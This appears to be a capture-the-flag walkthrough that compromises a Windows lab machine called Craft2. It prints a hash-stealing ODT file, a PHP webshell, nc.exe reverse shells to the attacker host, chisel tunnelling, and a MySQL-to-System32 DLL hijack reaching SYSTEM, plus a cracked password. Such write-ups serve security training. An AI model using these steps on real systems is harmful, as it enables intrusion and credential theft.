# Exploitation Guide for Craft2
### Summary

In this guide, we will leverage a file upload function on a web application to capture the NTLM hash of a user and gain a foothold on the target system. We will then elevate our privilege by abusing a misconfigured MySQL database.

### Enumeration Nmap

We start off with an nmap scan.
```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 192.168.213.129
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-31 01:14 EST
Nmap scan report for DC01 (192.168.213.129)
Host is up (0.00039s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Navigating to port 80 in the browser, we discover a webpage titled Craft which contains an upload form. The admin login causes an “Under Construction” alert when visited.

When we try to upload a file, we receive a error: "File is not valid. Please submit ODT file".

When we submit an ODT file, we receive a different response: "You're resume was submitted, it will be reviewed shortly by our staff. We are also aware of macro phishing attempts made previously".
Exploitation
NTLMv2 Theft through ODT File

From the information retrieved after uploading a file, we know that our uploaded ODT files is reviewed by a staff.  This can be exploited by uploading an ODT file embedded with malicious code to steal the NTLMv2 hash of the user reviewing the file.

To create our ODT file, we will need to:
```
    Open LibreOffice Writer

    Insert → Object → OLE Object → Create From File

    Check “create from file” and “Link to file”

    In file parameter, select any file and then click "OK".

    Save the file as "test1.odt" and exit libreoffice.
```
We now have an ODT file that we can work with. Let's unzip the file to view the source files.
```
┌──(kali㉿kali)-[~]
└─$ unzip test1.odt
Archive:  test1.odt
 extracting: mimetype
 inflating: ObjectReplacements/Object 1
 inflating: settings.xml
 extracting: Thumbnails/thumbnail.png
 creating: Configurations2/toolbar/
 creating: Configurations2/floater/
 creating: Configurations2/popupmenu/
 creating: Configurations2/menubar/
 creating: Configurations2/accelerator/
 creating: Configurations2/toolpanel/
 creating: Configurations2/progressbar/
 creating: Configurations2/statusbar/
 creating: Configurations2/images/Bitmaps/
 inflating: manifest.rdf
 inflating: meta.xml
 inflating: styles.xml
 inflating: content.xml
 inflating: META-INF/manifest.xml
```
We can edit content.xml and replace the href value of the file you selected previously to file://IP/test.jpg in the tag that starts with `<draw:object .`

```
<draw:object xlink:href="file://192.168.213.128/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

With our changes in place, we re-zip the document back to an ODT file.
```
┌──(kali㉿kali)-[~]
└─$ ls -la
total 72
drwxr-xr-x  6 kali kali  4096 Jan 31 01:29 .
drwxr-xr-x 23 kali kali  4096 Jan 30 20:53 ..
drwxr-xr-x 11 root root  4096 Jan 31 01:25 Configurations2
-rw-r--r--  1 root root  4342 Jan 31 01:27 content.xml
-rw-r--r--  1 root root   899 Jan 31  2022 manifest.rdf
drwxr-xr-x  2 root root  4096 Jan 31 01:25 META-INF
-rw-r--r--  1 root root   971 Jan 31  2022 meta.xml
-rw-r--r--  1 root root    39 Jan 31  2022 mimetype
drwxr-xr-x  2 root root  4096 Jan 31 01:25 ObjectReplacements
-rw-r--r--  1 root root 12781 Jan 31  2022 settings.xml
-rw-r--r--  1 root root 12198 Jan 31  2022 styles.xml
drwxr-xr-x  2 root root  4096 Jan 31 01:25 Thumbnails
```

# Zip Document
```
┌──(kali㉿kali)-[~]
└─$ zip -r Document.odt *
 adding: Configurations2/ (stored 0%)
 adding: Configurations2/menubar/ (stored 0%)
 adding: Configurations2/images/ (stored 0%)
 adding: Configurations2/images/Bitmaps/ (stored 0%)
 adding: Configurations2/accelerator/ (stored 0%)
 adding: Configurations2/popupmenu/ (stored 0%)
 adding: Configurations2/progressbar/ (stored 0%)
 adding: Configurations2/floater/ (stored 0%)
 adding: Configurations2/statusbar/ (stored 0%)
 adding: Configurations2/toolbar/ (stored 0%)
 adding: Configurations2/toolpanel/ (stored 0%)
 adding: content.xml (deflated 74%)
 adding: manifest.rdf (deflated 71%)
 adding: META-INF/ (stored 0%)
 adding: META-INF/manifest.xml (deflated 70%)
 adding: meta.xml (deflated 54%)
 adding: mimetype (stored 0%)
 adding: ObjectReplacements/ (stored 0%)
 adding: ObjectReplacements/Object 1 (deflated 74%)
 adding: settings.xml (deflated 86%)
 adding: styles.xml (deflated 82%)
 adding: Thumbnails/ (stored 0%)
 adding: Thumbnails/thumbnail.png (deflated 56%)
```
Our malicious ODT file is ready! Before uploading it to the webapp, we have to start responder.

`responder -I tun0 -rv`

We upload the malicious ODT file and after waiting for a bit, we receive a NTLMv2 hash of a user named "thecybergeek".
```
[SMB] NTLMv2-SSP Client   : 192.168.213.129
[SMB] NTLMv2-SSP Username : CRAFT2\thecybergeek
[SMB] NTLMv2-SSP Hash     : thecybergeek::CRAFT2:8d70b031b302a14f:D4E79B85FF9299811881963DDD0C0DA9:010100000000000000CFFB344216D8014AC454CAACE7561D0000000002000800350043005000510001001E00570049004E002D0049004F005A004400570059003000430054005700350004003400570049004E002D0049004F005A00440057005900300043005400570035002E0035004300500051002E004C004F00430041004C000300140035004300500051002E004C004F00430041004C000500140035004300500051002E004C004F00430041004C000700080000CFFB344216D801060004000200000008003000300000000000000000000000003000008D7EDA3948436DB0E0A396792EFF289A03D8F881A2B477A020F1B2BA3D6C9B330A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003200310033002E003100320038000000000000000000
```
We will save the NTLMv2 hash to a file and crack the hash with john.
```
┌──(kali㉿kali)-[~]
└─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
winniethepooh    (thecybergeek)
1g 0:00:00:00 DONE (2022-01-31 01:32) 100.0g/s 307200p/s 307200c/s 307200C/s 123456..dangerous
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
We now have the password for the user "thecybergeek": winniethepooh.
Foothold through Apache + SMB Share

Using the credentials we found, we can list smb shares.
```
┌──(kali㉿kali)-[~]
└─$ smbclient -U thecybergeek -L \\\\192.168.213.129\\
Enter WORKGROUP\thecybergeek's password:

 Sharename       Type      Comment
 ---------       ----      -------
 ADMIN$          Disk      Remote Admin
 C$              Disk      Default share
 IPC$            IPC       Remote IPC
 WebApp          Disk
SMB1 disabled -- no workgroup available
```
We find a share named WebApp. We can assume that the web application files are stored in this share. Let's test if we have write permissions on this share.
```
┌──(kali㉿kali)-[~]
└─$ smbclient -U thecybergeek \\\\192.168.213.129\\WebApp

Enter WORKGROUP\thecybergeek's password:
Try "help" to get a list of possible commands.

smb: \> dir
 .                                   D        0  Mon Jan 31 01:35:49 2022
 ..                                  D        0  Mon Jan 31 01:35:49 2022
 assets                              D        0  Mon Jan 31 00:30:24 2022
 css                                 D        0  Mon Jan 31 00:30:24 2022
 index.php                           A     9768  Mon Jan 31 11:21:52 2022
 js                                  D        0  Mon Jan 31 00:30:24 2022
 upload.php                          A      896  Mon Jan 31 10:23:02 2022
 uploads                             D        0  Mon Jan 31 01:31:19 2022 
 15570943 blocks of size 4096. 10655939 blocks available

smb: \> put test
putting file test as \test (0.0 kb/s) (average 0.0 kb/s)
```
We can upload files to the share. Let's upload a simple PHP webshell and a copy of nc.exe.

# PHP Shell Code
```
┌──(kali㉿kali)-[~]
└─$ cat shell.php
<?php system($_GET["cmd"]); ?>
```

# Upload nc.exe
```
┌──(kali㉿kali)-[~]
└─$ smbclient -U thecybergeek \\\\192.168.213.129\\WebApp

Enter WORKGROUP\thecybergeek's password:
Try "help" to get a list of possible commands.
smb: \> put shell.php
putting file shell.php as \shell.php (30.3 kb/s) (average 30.3 kb/s)
smb: \> put nc.exe
putting file nc.exe as \nc.exe (19332.7 kb/s) (average 19333.3 kb/s)
smb: \> exit
```
We need to start a netcat listener to catch a remote shell.

Then, we execute a curl request for the uploaded PHP webshell with a payload that runs nc.exe to call back to our kali host with a PowerShell session.
```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.213.129/shell.php\?cmd\=nc.exe%20192.168.213.128%201234%20-e%20powershell.exe
```
On our listener, we receive a connection from the target.
Let's start by uploading PrivescCheck to the target and executing it to identify any potential weaknesses on the target.
```
PS: C:\xampp\htdocs\tmp> Import-Module .\PrivescCheck.ps1

PS: C:\xampp\htdocs\tmp> Invoke-PrivescCheck -Extended
```
From the output, we discover that MySQL service is running as SYSTEM on port 3306 :
```
IPv4 TCP   0.0.0.0:3306        LISTENING 5308 mysqld
Name        : MySQL
DisplayName : MySQL
ImagePath   : C:\xampp\mysql\bin\mysqld.exe MySQL
User        : LocalSystem
StartMode   : Automatic
------------------------------

PS C:\xampp\htdocs\tmp> sc.exe qc MySQL
sc.exe qc MySQL
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: MySQL
 TYPE               : 10  WIN32_OWN_PROCESS
 START_TYPE         : 2   AUTO_START
 ERROR_CONTROL      : 1   NORMAL
 BINARY_PATH_NAME   : C:\xampp\mysql\bin\mysqld.exe MySQL
 LOAD_ORDER_GROUP   :
 TAG                : 0
 DISPLAY_NAME       : MySQL
 DEPENDENCIES       :
 SERVICE_START_NAME : LocalSystem
```
Let's move to the C:\xampp\mysql directory and see what our permissions are.
```
PS C:\xampp> whoami
whoami
craft2\apache

PS C:\xampp> cd mysql
cd mysql
PS C:\xampp\mysql> dir
dir
dir : Access to the path 'C:\xampp\mysql' is denied.
At line:1 char:1
+ dir
+ ~~~
 + CategoryInfo          : PermissionDenied: (C:\xampp\mysql:String) [Get-ChildItem], UnauthorizedAccessException
 + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```
It doesn't look like we have permission to view this directory. Instead, we could try to to forward the mysql port to our kali machine using chisel. Let's start chisel server on our kali host.
```
┌──(kali㉿kali)-[~]
└─$ chisel server -p 8000 --reverse
2022/03/21 14:21:59 server: Reverse tunnelling enabled
2022/03/21 14:21:59 server: Fingerprint YqJoP81ML0mrD3p2Mhd+Ix6WRr1Wb7e61RFzukVAP3Q=
2022/03/21 14:21:59 server: Listening on http://0.0.0.0:8000
```
On the target machine, we upload chisel.exe and use it to forward port 3306 to our kali machine.
```
PS C:\xampp\htdocs\tmp\> .\chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
2022/03/21 11:17:46 client: Connecting to ws://192.168.118.23:8000
2022/03/21 11:17:47 client: Connected (Latency 201.072ms)
```
On our kali machine, we receive a connection on the chisel server.
```
┌──(kali㉿kali)-[~]
└─$ chisel server -p 8000 --reverse
2022/03/21 14:16:39 server: Reverse tunnelling enabled
2022/03/21 14:16:39 server: Fingerprint NGVw4CKMKYm+BeU0nEYGVUo4SVGgBBg4fx1W50Z5YUg=
2022/03/21 14:16:39 server: Listening on http://0.0.0.0:8000
2022/03/21 14:17:45 server: session#1: Client version (1.7.7) differs from server version (0.0.0-src)
2022/03/21 14:17:45 server: session#1: tun: proxy#R:3306=>3306: Listening
```
With our port forwarding in place, we can connect to the mysql database.
```
┌──(kali㉿kali)-[~]
└─$ mysql -u root -h 127.0.0.1
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.4.19-MariaDB mariadb.org binary distribution
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
MariaDB [(none)]>

Exploiting MySQL to gain SYSTEM shell

The mysql service is running as SYSTEM, so we can try to write a file to the C:\test directory using the load_file and dumpfile functions in mysql.

MariaDB [(none)]> select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';

Query OK, 1 row affected (0.227 sec)
```
The shell.exe file was created and when we look at the permissions assigned to this newly created file, we realize that we have File Write permission as SYSTEM through mysql.
```
PS C:\test> dir
 Directory: C:\test

Mode                LastWriteTime         Length Name 
----                -------------         ------ ---- 
-a----        3/21/2022  11:15 AM        8230912 chisel.exe 
-a----        3/21/2022  11:37 AM          38616 nc.exe 
-a----        3/21/2022  11:39 AM          38616 shell.exe

PS C:\test> icacls C:\test\shell.exe
icacls C:\test\shell.exe
C:\test\shell.exe NT AUTHORITY\SYSTEM:(I)(F)
 BUILTIN\Administrators:(I)(F)
 BUILTIN\Users:(I)(RX)
Successfully processed 1 files; Failed processing 0 files

PS C:\test>

Using this reference, we find that we can compromise the target using the File Write permissions as SYSTEM. To achieve this, we’ll be using a tool called WerTrigger.

MariaDB [(none)]> select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";

Query OK, 1 row affected (0.292 sec)

The important files we will need to execute this type of attack are Report.wer, phoneinfo.dll & WerTrigger.exe. We upload these files to the target.

In the mysql shell on our kali machine, we write phoneinfo.dll to C:\Windows\System32\phoneinfo.dll :

MariaDB [(none)]> select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";

Query OK, 1 row affected (0.292 sec)
```
Next, we execute WerTrigger.exe and then execute nc.exe through it to get shell as SYSTEM. After running WerTrigger.exe, we won't receive any prompt but we can still enter commands to execute.
```
C:\test>WerTrigger.exe
WerTrigger.exe
C:\test\nc.exe 192.168.213.128 445 -e cmd.exe
```
On our kali machine, we receive connection from the target as nt authority\system
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 445
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::445
Ncat: Listening on 0.0.0.0:445
Ncat: Connection from 192.168.120.76.
Ncat: Connection from 192.168.120.76:49684.
Microsoft Windows [Version 10.0.17763.2565]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```
We have successfully achieved system level access on the target system.
